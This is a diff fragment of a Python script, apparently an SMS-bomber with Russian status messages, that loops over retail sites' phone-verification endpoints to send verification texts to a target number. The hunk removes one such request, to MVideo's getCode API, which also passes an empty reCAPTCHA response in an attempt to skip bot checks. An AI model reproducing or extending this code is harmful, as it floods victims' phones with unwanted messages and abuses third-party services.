@@ -418,17 +418,15 @@ while True:
 
 		print('[-] Не отправлено!')
 
-	try:
+	
 
-		requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "reca
 
-ptcha": 'off', "g-recaptcha-response": ""})
 
-		print('[+] MVideo отправлено!')
+		
 
-	except:
+	
 
-		print('[-] Не отправлено!')
+		
 
 	try:
 
